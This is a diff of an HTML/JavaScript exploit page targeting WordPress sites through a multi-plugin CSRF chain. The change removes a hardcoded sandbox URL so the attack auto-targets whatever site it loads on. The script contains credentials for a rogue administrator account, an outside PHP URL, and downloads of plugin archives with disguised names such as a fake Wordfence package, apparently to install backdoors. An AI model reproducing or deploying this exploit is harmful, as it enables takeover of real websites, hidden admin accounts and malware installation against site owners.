@@ -2,23 +2,24 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>WordPress Multi-Plugin CSRF PoC</title>
+    <title>WordPress autooo Fully Automated Exploit Chain</title>
 </head>
 <body>
-    <h2>Running Multi-Plugin Exploit Chain... Please Wait.</h2>
+    <h2>Running Fully Automated Exploit Chain... Please Wait.</h2>
     <p>Check your browser's Developer Console (F12) to view real-time execution steps.</p>
 
     <script>
         (function () {
             "use strict";
 
+            // Automatically detects the current WordPress domain/origin
+            const o = window.location.origin;
+            console.log("[*] Auto-detected Target Origin:", o);
+
             const U = "wpadmin";
             const P = "WpAdmin2026!X";
             const E = "mailt7767@gmail.com";
             const L = "https://static.top/2.php";
-            
-            // ---> HARDCODE YOUR TARGET SANDBOX URL HERE <---
-            const TARGET_URL = "https://naturalcolor.s2-tastewp.com"; 
 
             const PLUGIN_URLS = [
                 "https://raw.githubusercontent.com/mailt7767-oss/esfew/main/Wordfence-Security-API.zip",
@@ -40,9 +41,6 @@
             }
 
             (async function () {
-                const o = TARGET_URL.replace(/\/$/, '');
-                console.log("[*] Target Origin Set To:", o);
-
                 // ==========================================
                 // VECTOR 1: Create Administrator Account
                 // ==========================================
